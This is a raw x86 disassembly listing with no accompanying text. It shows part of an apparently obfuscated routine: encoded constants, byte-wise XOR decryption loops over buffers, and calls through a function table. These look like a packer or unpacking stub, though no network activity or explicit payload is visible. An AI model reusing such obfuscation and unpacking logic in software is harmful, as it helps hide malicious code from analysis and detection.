  424e1b:	mov    eax,DWORD PTR [ebp-0x10]
  424e1e:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e21:	xor    eax,ebx
  424e23:	add    eax,esi
  424e25:	cmp    eax,ecx
  424e27:	je     0x42558f
  424e2d:	mov    eax,DWORD PTR [ebp-0x10]
  424e30:	xor    eax,ebx
  424e32:	add    eax,esi
  424e34:	jmp    0x424e52
  424e36:	mov    edi,DWORD PTR [ebp-0x2c]
  424e39:	mov    cl,al
  424e3b:	and    cl,0x1f
  424e3e:	or     dl,0xff
  424e41:	sub    dl,cl
  424e43:	add    BYTE PTR [edi+eax*1],dl
  424e46:	mov    ecx,DWORD PTR [ebp-0x18]
  424e49:	xor    ecx,ebx
  424e4b:	lea    eax,[eax+ecx*1+0x3272f6]
  424e52:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e55:	cmp    eax,ecx
  424e57:	jb     0x424e36
  424e59:	mov    eax,DWORD PTR [ebp-0x3c]
  424e5c:	mov    DWORD PTR [ebp-0x28],eax
  424e5f:	mov    eax,DWORD PTR [ebp-0x2c]
  424e62:	mov    DWORD PTR [ebp-0x34],0xf89c85a5
  424e69:	mov    DWORD PTR [ebp-0xd4],eax
  424e6f:	mov    edi,0xf89c85a4
  424e74:	mov    DWORD PTR [ebp-0x30],edi
  424e77:	mov    eax,DWORD PTR [ebp-0x34]
  424e7a:	xor    eax,ebx
  424e7c:	add    eax,esi
  424e7e:	mov    DWORD PTR [ebp-0xc],eax
  424e81:	mov    eax,DWORD PTR [ebp-0x34]
  424e84:	xor    eax,ebx
  424e86:	add    eax,esi
  424e88:	mov    DWORD PTR [ebp-0x8],eax
  424e8b:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  424e92:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  424e99:	mov    eax,DWORD PTR [ebp-0x34]
  424e9c:	mov    ecx,DWORD PTR [ebp-0x28]
  424e9f:	xor    eax,ebx
  424ea1:	add    eax,esi
  424ea3:	cmp    ecx,eax
  424ea5:	je     0x4250a4
  424eab:	jmp    0x425080
  424eb0:	mov    ecx,DWORD PTR [ebp-0xc]
  424eb3:	mov    eax,DWORD PTR [ebp-0x28]
  424eb6:	sub    eax,ecx
  424eb8:	mov    ecx,DWORD PTR [ebp-0x44]
  424ebb:	xor    ecx,ebx
  424ebd:	add    ecx,esi
  424ebf:	xor    edx,edx
  424ec1:	div    ecx
  424ec3:	mov    DWORD PTR [ebp-0x8],eax
  424ec6:	mov    eax,DWORD PTR [ebp-0x4c]
  424ec9:	mov    ecx,DWORD PTR [ebp-0x8]
  424ecc:	xor    eax,ebx
  424ece:	add    eax,esi
  424ed0:	cmp    ecx,eax
  424ed2:	jbe    0x424ede
  424ed4:	mov    eax,DWORD PTR [ebp-0x4c]
  424ed7:	xor    eax,ebx
  424ed9:	add    eax,esi
  424edb:	mov    DWORD PTR [ebp-0x8],eax
  424ede:	mov    eax,DWORD PTR [ebp-0x44]
  424ee1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ee4:	xor    eax,ebx
  424ee6:	add    eax,esi
  424ee8:	imul   eax,ecx
  424eeb:	mov    DWORD PTR [ebp-0x8],eax
  424eee:	mov    eax,DWORD PTR [ebp-0x34]
  424ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ef4:	xor    eax,ebx
  424ef6:	add    eax,esi
  424ef8:	cmp    ecx,eax
  424efa:	je     0x42506e
  424f00:	mov    eax,DWORD PTR [ebp-0x8]
  424f03:	mov    DWORD PTR [ebp-0x14],eax
  424f06:	mov    eax,DWORD PTR [ebp-0xc]
  424f09:	add    eax,DWORD PTR [ebp-0xd4]
  424f0f:	mov    DWORD PTR [ebp-0x24],0xf89c85a5
  424f16:	mov    DWORD PTR [ebp-0x20],edi
  424f19:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  424f23:	mov    DWORD PTR [ebp-0x8],eax
  424f26:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  424f2d:	mov    DWORD PTR [ebp-0x1c],edi
  424f30:	mov    eax,DWORD PTR [ebp-0x24]
  424f33:	xor    eax,ebx
  424f35:	add    eax,esi
  424f37:	jmp    0x42502d
  424f3c:	mov    DWORD PTR [ebp-0xe0],0xf89c85ba
  424f46:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  424f50:	mov    eax,DWORD PTR [ebp-0x1c]
  424f53:	mov    ecx,DWORD PTR [ebp-0x48]
  424f56:	xor    eax,ebx
  424f58:	add    eax,esi
  424f5a:	imul   eax,ecx
  424f5d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f60:	mov    al,BYTE PTR [eax+ecx*1]
  424f63:	mov    BYTE PTR [ebp-0x2],al
  424f66:	mov    eax,DWORD PTR [ebp-0x1c]
  424f69:	mov    ecx,DWORD PTR [ebp-0x48]
  424f6c:	xor    eax,ebx
  424f6e:	add    eax,esi
  424f70:	imul   eax,ecx
  424f73:	mov    ecx,DWORD PTR [ebp-0xe8]
  424f79:	xor    ecx,ebx
  424f7b:	add    eax,ecx
  424f7d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f80:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424f88:	mov    ecx,DWORD PTR [ebp-0xe0]
  424f8e:	xor    ecx,ebx
  424f90:	lea    eax,[ecx+eax*1+0x3272f6]
  424f97:	movzx  ecx,BYTE PTR [ebp-0x2]
  424f9b:	xor    ecx,eax
  424f9d:	mov    BYTE PTR [ebp-0x2],cl
  424fa0:	mov    al,BYTE PTR [ebp-0x2]
  424fa3:	mov    ecx,DWORD PTR [ebp-0x1c]
  424fa6:	mov    edx,DWORD PTR [ebp-0x48]
  424fa9:	xor    ecx,ebx
  424fab:	add    ecx,esi
  424fad:	imul   ecx,edx
  424fb0:	mov    edx,DWORD PTR [ebp-0x8]
  424fb3:	mov    BYTE PTR [ecx+edx*1],al
  424fb6:	mov    eax,DWORD PTR [ebp-0x1c]
  424fb9:	mov    ecx,DWORD PTR [ebp-0x48]
  424fbc:	xor    eax,ebx
  424fbe:	add    eax,esi
  424fc0:	imul   eax,ecx
  424fc3:	mov    ecx,DWORD PTR [ebp-0x8]
  424fc6:	mov    al,BYTE PTR [eax+ecx*1]
  424fc9:	mov    BYTE PTR [ebp-0x2],al
  424fcc:	mov    eax,DWORD PTR [ebp-0x1c]
  424fcf:	mov    ecx,DWORD PTR [ebp-0x48]
  424fd2:	xor    eax,ebx
  424fd4:	add    eax,esi
  424fd6:	imul   eax,ecx
  424fd9:	mov    ecx,DWORD PTR [ebp-0x20]
  424fdc:	xor    ecx,ebx
  424fde:	add    eax,ecx
  424fe0:	mov    ecx,DWORD PTR [ebp-0x8]
  424fe3:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424feb:	mov    ecx,DWORD PTR [ebp-0xc4]
  424ff1:	xor    ecx,ebx
  424ff3:	lea    eax,[ecx+eax*1+0x3272f6]
  424ffa:	movzx  ecx,BYTE PTR [ebp-0x2]
  424ffe:	xor    ecx,eax
  425000:	mov    BYTE PTR [ebp-0x2],cl
  425003:	mov    al,BYTE PTR [ebp-0x2]
  425006:	mov    ecx,DWORD PTR [ebp-0x1c]
  425009:	mov    edx,DWORD PTR [ebp-0x48]
  42500c:	xor    ecx,ebx
  42500e:	add    ecx,esi
  425010:	imul   ecx,edx
  425013:	mov    edx,DWORD PTR [ebp-0x8]
  425016:	mov    BYTE PTR [ecx+edx*1],al
  425019:	mov    eax,DWORD PTR [ebp-0x38]
  42501c:	mov    ecx,DWORD PTR [ebp-0x20]
  42501f:	xor    eax,ebx
  425021:	xor    ecx,ebx
  425023:	add    eax,esi
  425025:	add    ecx,esi
  425027:	imul   eax,ecx
  42502a:	add    eax,DWORD PTR [ebp-0x48]
  42502d:	mov    DWORD PTR [ebp-0x48],eax
  425030:	mov    eax,DWORD PTR [ebp-0x48]
  425033:	mov    ecx,DWORD PTR [ebp-0x14]
  425036:	cmp    ecx,eax
  425038:	jb     0x424f3c
  42503e:	mov    eax,DWORD PTR [ebp-0x20]
  425041:	mov    ecx,DWORD PTR [ebp-0x14]
  425044:	xor    eax,ebx
  425046:	add    eax,esi
  425048:	imul   eax,ecx
  42504b:	mov    ecx,DWORD PTR [ebp-0x24]
  42504e:	xor    ecx,ebx
  425050:	add    ecx,esi
  425052:	or     eax,ecx
  425054:	mov    ecx,DWORD PTR [ebp-0x30]
  425057:	xor    ecx,ebx
  425059:	add    eax,ecx
  42505b:	mov    ecx,DWORD PTR [ebp-0x30]
  42505e:	xor    ecx,ebx
  425060:	add    eax,ecx
  425062:	mov    ecx,DWORD PTR [ebp-0xc]
  425065:	lea    eax,[eax+ecx*1+0x64e5ec]
  42506c:	jmp    0x42507d
  42506e:	mov    eax,DWORD PTR [ebp-0x30]
  425071:	mov    ecx,DWORD PTR [ebp-0xc]
  425074:	xor    eax,ebx
  425076:	lea    eax,[eax+ecx*1+0x3272f6]
  42507d:	mov    DWORD PTR [ebp-0xc],eax
  425080:	mov    eax,DWORD PTR [ebp-0x30]
  425083:	xor    eax,ebx
  425085:	mov    ecx,0xffcd8d0a
  42508a:	sub    ecx,eax
  42508c:	add    ecx,DWORD PTR [ebp-0x28]
  42508f:	mov    eax,DWORD PTR [ebp-0x30]
  425092:	mov    edx,DWORD PTR [ebp-0xc]
  425095:	xor    eax,ebx
  425097:	add    eax,esi
  425099:	imul   eax,edx
  42509c:	cmp    eax,ecx
  42509e:	jbe    0x424eb0
  4250a4:	mov    eax,DWORD PTR [ebp-0x10]
  4250a7:	mov    ecx,DWORD PTR [ebp-0x3c]
  4250aa:	mov    eax,DWORD PTR [ebp+0x8]
  4250ad:	mov    edx,DWORD PTR [ebp-0x54]
  4250b0:	mov    eax,DWORD PTR [eax+0x1e0]
  4250b6:	xor    edx,ebx
  4250b8:	add    edx,esi
  4250ba:	push   edx
  4250bb:	mov    edx,DWORD PTR [ebp-0x40]
  4250be:	xor    edx,ebx
  4250c0:	add    edx,esi
  4250c2:	push   edx
  4250c3:	push   ecx
  4250c4:	mov    DWORD PTR [ebp-0x38],ecx
  4250c7:	mov    ecx,DWORD PTR [ebp-0x10]
  4250ca:	xor    ecx,ebx
  4250cc:	add    ecx,esi
  4250ce:	push   ecx
  4250cf:	call   DWORD PTR [eax+0x14]
  4250d2:	mov    edi,eax
  4250d4:	mov    eax,DWORD PTR [ebp-0x10]
  4250d7:	xor    eax,ebx
  4250d9:	add    eax,esi
  4250db:	cmp    eax,edi
  4250dd:	je     0x425138
  4250df:	mov    eax,DWORD PTR [ebp-0x10]
  4250e2:	jmp    0x425105
  4250e4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4250e7:	xor    eax,ebx
  4250e9:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f6]
  4250f0:	mov    BYTE PTR [eax+edi*1+0x3272f6],cl
  4250f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4250fa:	xor    ecx,ebx
  4250fc:	lea    eax,[ecx+eax*1+0x3272f6]
  425103:	xor    eax,ebx
  425105:	mov    ecx,DWORD PTR [ebp-0x3c]
  425108:	sub    ecx,esi
  42510a:	xor    ecx,ebx
  42510c:	cmp    eax,ecx
  42510e:	jne    0x4250e4
  425110:	mov    eax,DWORD PTR [ebp+0x8]
  425113:	mov    ecx,DWORD PTR [ebp-0x50]
  425116:	mov    eax,DWORD PTR [eax+0x1e0]
  42511c:	xor    ecx,ebx
  42511e:	add    ecx,esi
  425120:	push   ecx
  425121:	mov    ecx,DWORD PTR [ebp-0x10]
  425124:	xor    ecx,ebx
  425126:	add    ecx,esi
  425128:	push   ecx
  425129:	push   DWORD PTR [ebp-0x2c]
  42512c:	call   DWORD PTR [eax+0x18]
  42512f:	mov    eax,DWORD PTR [ebp-0x38]
  425132:	mov    DWORD PTR [ebp-0x2c],edi
  425135:	mov    DWORD PTR [ebp-0x3c],eax
  425138:	mov    eax,DWORD PTR [ebp-0x2c]
  42513b:	mov    DWORD PTR [ebp-0x14],eax
  42513e:	mov    eax,DWORD PTR [ebp-0x18]
  425141:	mov    ecx,DWORD PTR [ebp-0x10]
  425144:	xor    eax,ebx
  425146:	add    eax,esi
  425148:	mov    DWORD PTR [ebp-0x5c],0x422b332b
  42514f:	mov    DWORD PTR [ebp-0x58],0x382b402b
  425156:	jmp    0x425189
  425158:	mov    edx,DWORD PTR [ebp-0x14]
  42515b:	mov    edi,ecx
  42515d:	xor    edi,ebx
  42515f:	mov    cl,BYTE PTR [ebp+edi*1+0x32729a]
  425166:	movsx  edx,BYTE PTR [edi+edx*1+0x3272f6]
  42516e:	xor    cl,0x7f
  425171:	add    cl,0x4
  425174:	movzx  ecx,cl
  425177:	cmp    edx,ecx
  425179:	jne    0x425193
  42517b:	mov    ecx,DWORD PTR [ebp-0x18]
  42517e:	xor    ecx,ebx
  425180:	lea    ecx,[ecx+edi*1+0x3272f6]
  425187:	xor    ecx,ebx
  425189:	cmp    ecx,0xf89c85bd
  42518f:	jne    0x425158
  425191:	jmp    0x42519a
  425193:	mov    eax,DWORD PTR [ebp-0x10]
  425196:	xor    eax,ebx
  425198:	add    eax,esi
  42519a:	mov    ecx,DWORD PTR [ebp-0x10]
  42519d:	xor    ecx,ebx
  42519f:	add    ecx,esi
  4251a1:	cmp    ecx,eax
  4251a3:	je     0x425319
  4251a9:	mov    eax,DWORD PTR [ebp-0x14]
  4251ac:	mov    eax,DWORD PTR [eax+0x8]
  4251af:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4251b6:	mov    DWORD PTR [ebp-0x40],0xf89cc3d6
  4251bd:	mov    DWORD PTR [ebp-0x44],0xf89cb5a5
  4251c4:	mov    DWORD PTR [ebp-0x24],0xf89c85a1
  4251cb:	mov    DWORD PTR [ebp-0x20],eax
  4251ce:	mov    eax,DWORD PTR [ebp+0x8]
  4251d1:	mov    ecx,DWORD PTR [ebp-0x24]
  4251d4:	xor    ecx,ebx
  4251d6:	add    ecx,esi
  4251d8:	push   ecx
  4251d9:	mov    ecx,DWORD PTR [ebp-0x44]
  4251dc:	mov    eax,DWORD PTR [eax+0x1e0]
  4251e2:	xor    ecx,ebx
  4251e4:	add    ecx,esi
  4251e6:	push   ecx
  4251e7:	mov    ecx,DWORD PTR [ebp-0x40]
  4251ea:	xor    ecx,ebx
  4251ec:	add    ecx,esi
  4251ee:	push   ecx
  4251ef:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f2:	xor    ecx,ebx
  4251f4:	add    ecx,esi
  4251f6:	push   ecx
  4251f7:	call   DWORD PTR [eax+0x14]
  4251fa:	mov    edi,eax
  4251fc:	mov    eax,DWORD PTR [ebp+0x8]
  4251ff:	mov    ecx,DWORD PTR [ebp-0x24]
  425202:	mov    eax,DWORD PTR [eax+0x1e0]
  425208:	xor    ecx,ebx
  42520a:	add    ecx,esi
  42520c:	push   ecx
  42520d:	mov    ecx,DWORD PTR [ebp-0x44]
  425210:	xor    ecx,ebx
  425212:	add    ecx,esi
  425214:	push   ecx
  425215:	mov    ecx,DWORD PTR [ebp-0xc]
  425218:	push   DWORD PTR [ebp-0x20]
  42521b:	xor    ecx,ebx
  42521d:	add    ecx,esi
  42521f:	push   ecx
  425220:	call   DWORD PTR [eax+0x14]
  425223:	mov    ecx,DWORD PTR [ebp-0xc]
  425226:	xor    ecx,ebx
  425228:	add    ecx,esi
  42522a:	mov    DWORD PTR [ebp-0x24],eax
  42522d:	cmp    ecx,edi
  42522f:	je     0x4255bc
  425235:	mov    ecx,DWORD PTR [ebp-0xc]
  425238:	xor    ecx,ebx
  42523a:	add    ecx,esi
  42523c:	cmp    ecx,eax
  42523e:	je     0x4255bc
  425244:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  42524b:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  425252:	mov    ecx,DWORD PTR [ebp-0x40]
  425255:	xor    cl,0xaf
  425258:	sub    cl,0xa
  42525b:	mov    BYTE PTR [edi],cl
  42525d:	mov    ecx,DWORD PTR [ebp-0xc]
  425260:	xor    cl,0xaf
  425263:	sub    cl,0xa
  425266:	mov    BYTE PTR [edi+0x1],cl
  425269:	mov    ecx,DWORD PTR [ebp-0x54]
  42526c:	xor    cl,0xaf
  42526f:	sub    cl,0xa
  425272:	mov    BYTE PTR [edi+0x2],cl
  425275:	and    DWORD PTR [ebp-0xc8],0x0
  42527c:	and    DWORD PTR [ebp-0xdc],0x0
  425283:	lea    ecx,[ebp-0xdc]
  425289:	push   ecx
  42528a:	push   DWORD PTR [ebp-0x20]
  42528d:	push   eax
  42528e:	lea    eax,[ebp-0xc8]
  425294:	push   eax
  425295:	mov    eax,DWORD PTR [ebp-0x14]
  425298:	push   DWORD PTR [eax+0xc]
  42529b:	mov    eax,DWORD PTR [ebp-0x2c]
  42529e:	add    eax,0x10
  4252a1:	push   eax
  4252a2:	push   edi
  4252a3:	call   0x424547
  4252a8:	mov    DWORD PTR [ebp-0x40],eax
  4252ab:	mov    eax,DWORD PTR [ebp+0x8]
  4252ae:	mov    ecx,DWORD PTR [ebp-0x50]
  4252b1:	mov    eax,DWORD PTR [eax+0x1e0]
  4252b7:	xor    ecx,ebx
  4252b9:	add    ecx,esi
  4252bb:	push   ecx
  4252bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4252bf:	xor    ecx,ebx
  4252c1:	add    ecx,esi
  4252c3:	push   ecx
  4252c4:	push   edi
  4252c5:	call   DWORD PTR [eax+0x18]
  4252c8:	mov    eax,DWORD PTR [ebp-0x40]
  4252cb:	add    eax,0xffcd8d0a
  4252d0:	xor    eax,ebx
  4252d2:	cmp    eax,0xf89c85a5
  4252d7:	mov    eax,DWORD PTR [ebp+0x8]
  4252da:	mov    eax,DWORD PTR [eax+0x1e0]
  4252e0:	mov    ecx,DWORD PTR [ebp-0x50]
  4252e3:	jne    0x425306
  4252e5:	xor    ecx,ebx
  4252e7:	add    ecx,esi
  4252e9:	push   ecx
  4252ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4252ed:	xor    ecx,ebx
  4252ef:	add    ecx,esi
  4252f1:	push   ecx
  4252f2:	push   DWORD PTR [ebp-0x2c]
  4252f5:	call   DWORD PTR [eax+0x18]
  4252f8:	mov    eax,DWORD PTR [ebp-0x24]
  4252fb:	mov    DWORD PTR [ebp-0x2c],eax
  4252fe:	mov    eax,DWORD PTR [ebp-0x20]
  425301:	mov    DWORD PTR [ebp-0x3c],eax
  425304:	jmp    0x425319
  425306:	xor    ecx,ebx
  425308:	add    ecx,esi
  42530a:	push   ecx
  42530b:	mov    ecx,DWORD PTR [ebp-0xc]
  42530e:	xor    ecx,ebx
  425310:	add    ecx,esi
  425312:	push   ecx
  425313:	push   DWORD PTR [ebp-0x24]
  425316:	call   DWORD PTR [eax+0x18]
  425319:	mov    eax,DWORD PTR [ebp-0x3c]
  42531c:	mov    DWORD PTR [ebp-0x34],eax
  42531f:	mov    eax,DWORD PTR [ebp-0x2c]
  425322:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  425329:	mov    DWORD PTR [ebp-0x40],eax
  42532c:	mov    edi,0xf89c85a4
  425331:	mov    DWORD PTR [ebp-0x30],edi
  425334:	mov    eax,DWORD PTR [ebp-0x28]
  425337:	xor    eax,ebx
  425339:	add    eax,esi
  42533b:	mov    DWORD PTR [ebp-0xc],eax
  42533e:	mov    eax,DWORD PTR [ebp-0x28]
  425341:	xor    eax,ebx
  425343:	add    eax,esi
  425345:	mov    DWORD PTR [ebp-0x14],eax
  425348:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  42534f:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  425356:	mov    eax,DWORD PTR [ebp-0x28]
  425359:	mov    ecx,DWORD PTR [ebp-0x34]
  42535c:	xor    eax,ebx
  42535e:	add    eax,esi
  425360:	cmp    ecx,eax
  425362:	je     0x425558
  425368:	jmp    0x425534
  42536d:	mov    ecx,DWORD PTR [ebp-0xc]
  425370:	mov    eax,DWORD PTR [ebp-0x34]
  425373:	sub    eax,ecx
  425375:	mov    ecx,DWORD PTR [ebp-0x44]
  425378:	xor    ecx,ebx
  42537a:	add    ecx,esi
  42537c:	xor    edx,edx
  42537e:	div    ecx
  425380:	mov    DWORD PTR [ebp-0x14],eax
  425383:	mov    eax,DWORD PTR [ebp-0x24]
  425386:	mov    ecx,DWORD PTR [ebp-0x14]
  425389:	xor    eax,ebx
  42538b:	add    eax,esi
  42538d:	cmp    ecx,eax
  42538f:	jbe    0x42539b
  425391:	mov    eax,DWORD PTR [ebp-0x24]
  425394:	xor    eax,ebx
  425396:	add    eax,esi
  425398:	mov    DWORD PTR [ebp-0x14],eax
  42539b:	mov    eax,DWORD PTR [ebp-0x44]
  42539e:	mov    ecx,DWORD PTR [ebp-0x14]
  4253a1:	xor    eax,ebx
  4253a3:	add    eax,esi
  4253a5:	imul   eax,ecx
  4253a8:	mov    DWORD PTR [ebp-0x14],eax
  4253ab:	mov    eax,DWORD PTR [ebp-0x28]
  4253ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4253b1:	xor    eax,ebx
  4253b3:	add    eax,esi
  4253b5:	cmp    ecx,eax
  4253b7:	je     0x425522
  4253bd:	mov    eax,DWORD PTR [ebp-0x14]
  4253c0:	mov    DWORD PTR [ebp-0x20],eax
  4253c3:	mov    eax,DWORD PTR [ebp-0xc]
  4253c6:	add    eax,DWORD PTR [ebp-0x40]
  4253c9:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  4253d0:	mov    DWORD PTR [ebp-0x14],edi
  4253d3:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  4253da:	mov    DWORD PTR [ebp-0x1c],eax
  4253dd:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  4253e4:	mov    DWORD PTR [ebp-0x8],edi
  4253e7:	mov    eax,DWORD PTR [ebp-0x4c]
  4253ea:	xor    eax,ebx
  4253ec:	add    eax,esi
  4253ee:	jmp    0x4254e1
  4253f3:	mov    DWORD PTR [ebp-0xe4],0xf89c85ba
  4253fd:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  425407:	mov    eax,DWORD PTR [ebp-0x8]
  42540a:	mov    ecx,DWORD PTR [ebp-0x18]
  42540d:	xor    eax,ebx
  42540f:	add    eax,esi
  425411:	imul   eax,ecx
  425414:	mov    ecx,DWORD PTR [ebp-0x1c]
  425417:	mov    al,BYTE PTR [eax+ecx*1]
  42541a:	mov    BYTE PTR [ebp-0x1],al
  42541d:	mov    eax,DWORD PTR [ebp-0x8]
  425420:	mov    ecx,DWORD PTR [ebp-0x18]
  425423:	xor    eax,ebx
  425425:	add    eax,esi
  425427:	imul   eax,ecx
  42542a:	mov    ecx,DWORD PTR [ebp-0x54]
  42542d:	xor    ecx,ebx
  42542f:	add    eax,ecx
  425431:	mov    ecx,DWORD PTR [ebp-0x1c]
  425434:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42543c:	mov    ecx,DWORD PTR [ebp-0xe4]
  425442:	xor    ecx,ebx
  425444:	lea    eax,[ecx+eax*1+0x3272f6]
  42544b:	movzx  ecx,BYTE PTR [ebp-0x1]
  42544f:	xor    ecx,eax
  425451:	mov    BYTE PTR [ebp-0x1],cl
  425454:	mov    al,BYTE PTR [ebp-0x1]
  425457:	mov    ecx,DWORD PTR [ebp-0x8]
  42545a:	mov    edx,DWORD PTR [ebp-0x18]
  42545d:	xor    ecx,ebx
  42545f:	add    ecx,esi
  425461:	imul   ecx,edx
  425464:	mov    edx,DWORD PTR [ebp-0x1c]
  425467:	mov    BYTE PTR [ecx+edx*1],al
  42546a:	mov    eax,DWORD PTR [ebp-0x8]
  42546d:	mov    ecx,DWORD PTR [ebp-0x18]
  425470:	xor    eax,ebx
  425472:	add    eax,esi
  425474:	imul   eax,ecx
  425477:	mov    ecx,DWORD PTR [ebp-0x1c]
  42547a:	mov    al,BYTE PTR [eax+ecx*1]
  42547d:	mov    BYTE PTR [ebp-0x1],al
  425480:	mov    eax,DWORD PTR [ebp-0x8]
  425483:	mov    ecx,DWORD PTR [ebp-0x18]
  425486:	xor    eax,ebx
  425488:	add    eax,esi
  42548a:	imul   eax,ecx
  42548d:	mov    ecx,DWORD PTR [ebp-0x14]
  425490:	xor    ecx,ebx
  425492:	add    eax,ecx
  425494:	mov    ecx,DWORD PTR [ebp-0x1c]
  425497:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42549f:	mov    ecx,DWORD PTR [ebp-0xd0]
  4254a5:	xor    ecx,ebx
  4254a7:	lea    eax,[ecx+eax*1+0x3272f6]
  4254ae:	movzx  ecx,BYTE PTR [ebp-0x1]
  4254b2:	xor    ecx,eax
  4254b4:	mov    BYTE PTR [ebp-0x1],cl
  4254b7:	mov    al,BYTE PTR [ebp-0x1]
  4254ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4254bd:	mov    edx,DWORD PTR [ebp-0x18]
  4254c0:	xor    ecx,ebx
  4254c2:	add    ecx,esi
  4254c4:	imul   ecx,edx
  4254c7:	mov    edx,DWORD PTR [ebp-0x1c]
  4254ca:	mov    BYTE PTR [ecx+edx*1],al
  4254cd:	mov    eax,DWORD PTR [ebp-0x38]
  4254d0:	mov    ecx,DWORD PTR [ebp-0x14]
  4254d3:	xor    eax,ebx
  4254d5:	xor    ecx,ebx
  4254d7:	add    eax,esi
  4254d9:	add    ecx,esi
  4254db:	imul   eax,ecx
  4254de:	add    eax,DWORD PTR [ebp-0x18]
  4254e1:	mov    DWORD PTR [ebp-0x18],eax
  4254e4:	mov    eax,DWORD PTR [ebp-0x18]
  4254e7:	mov    ecx,DWORD PTR [ebp-0x20]
  4254ea:	cmp    ecx,eax
  4254ec:	jb     0x4253f3
  4254f2:	mov    eax,DWORD PTR [ebp-0x14]
  4254f5:	mov    ecx,DWORD PTR [ebp-0x20]
  4254f8:	xor    eax,ebx
  4254fa:	add    eax,esi
  4254fc:	imul   eax,ecx
  4254ff:	mov    ecx,DWORD PTR [ebp-0x4c]
  425502:	xor    ecx,ebx
  425504:	add    ecx,esi
  425506:	or     eax,ecx
  425508:	mov    ecx,DWORD PTR [ebp-0x30]
  42550b:	xor    ecx,ebx
  42550d:	add    eax,ecx
  42550f:	mov    ecx,DWORD PTR [ebp-0x30]
  425512:	xor    ecx,ebx
  425514:	add    eax,ecx
  425516:	mov    ecx,DWORD PTR [ebp-0xc]
  425519:	lea    eax,[eax+ecx*1+0x64e5ec]
  425520:	jmp    0x425531
  425522:	mov    eax,DWORD PTR [ebp-0x30]
  425525:	mov    ecx,DWORD PTR [ebp-0xc]
  425528:	xor    eax,ebx
  42552a:	lea    eax,[eax+ecx*1+0x3272f6]
  425531:	mov    DWORD PTR [ebp-0xc],eax
  425534:	mov    eax,DWORD PTR [ebp-0x30]
  425537:	xor    eax,ebx
  425539:	mov    ecx,0xffcd8d0a
  42553e:	sub    ecx,eax
  425540:	add    ecx,DWORD PTR [ebp-0x34]
  425543:	mov    eax,DWORD PTR [ebp-0x30]
  425546:	mov    edx,DWORD PTR [ebp-0xc]
  425549:	xor    eax,ebx
  42554b:	add    eax,esi
  42554d:	imul   eax,edx
  425550:	cmp    eax,ecx
  425552:	jbe    0x42536d
  425558:	push   DWORD PTR [ebp+0x8]
  42555b:	mov    eax,DWORD PTR [ebp+0x8]
  42555e:	push   DWORD PTR [eax+0x1cc]
  425564:	lea    eax,[ebp-0xd8]
  42556a:	push   eax
  42556b:	mov    eax,DWORD PTR [ebp+0x8]
  42556e:	mov    eax,DWORD PTR [eax+0x1c4]
  425574:	push   DWORD PTR [eax]
  425576:	mov    eax,DWORD PTR [ebp+0x8]
  425579:	mov    eax,DWORD PTR [eax+0x1c0]
  42557f:	push   DWORD PTR [eax]
  425581:	push   DWORD PTR [ebp-0x3c]
  425584:	push   DWORD PTR [ebp-0x2c]
  425587:	call   0x42601e
  42558c:	mov    DWORD PTR [ebp-0x40],eax
  42558f:	mov    eax,DWORD PTR [ebp-0x10]
  425592:	mov    ecx,DWORD PTR [ebp-0x2c]
  425595:	xor    eax,ebx
  425597:	add    eax,esi
  425599:	cmp    eax,ecx
  42559b:	je     0x4255bc
  42559d:	mov    eax,DWORD PTR [ebp+0x8]
  4255a0:	mov    ecx,DWORD PTR [ebp-0x50]
  4255a3:	mov    eax,DWORD PTR [eax+0x1e0]
  4255a9:	xor    ecx,ebx
  4255ab:	add    ecx,esi
  4255ad:	push   ecx
  4255ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4255b1:	xor    ecx,ebx
  4255b3:	add    ecx,esi
  4255b5:	push   ecx
  4255b6:	push   DWORD PTR [ebp-0x2c]
  4255b9:	call   DWORD PTR [eax+0x18]
  4255bc:	pop    edi
  4255bd:	pop    esi
  4255be:	pop    ebx
  4255bf:	leave  
  4255c0:	ret    0x4
  4255c3:	push   ebp
  4255c4:	mov    ebp,esp
  4255c6:	push   ecx
  4255c7:	push   ecx
  4255c8:	lea    eax,[ebp-0x8]
  4255cb:	mov    DWORD PTR [ebp-0x4],eax
  4255ce:	push   esi
  4255cf:	mov    esi,DWORD PTR [ebp-0x4]
  4255d2:	mov    eax,0xf881ba2f
  4255d7:	mov    DWORD PTR [esi],eax
  4255d9:	mov    esi,DWORD PTR [ebp-0x8]
  4255dc:	cmp    esi,eax
  4255de:	pop    esi
  4255df:	jne    0x4255e9
  4255e1:	mov    BYTE PTR [ecx+0xa],0x83
  4255e5:	mov    BYTE PTR [edx+0x8],0x30
  4255e9:	mov    BYTE PTR [edx+0xa],0x83
  4255ed:	mov    BYTE PTR [ecx+0x2],0x15
  4255f1:	leave  
  4255f2:	ret    
  4255f3:	push   ebp
  4255f4:	mov    ebp,esp
  4255f6:	push   ecx
  4255f7:	push   ecx
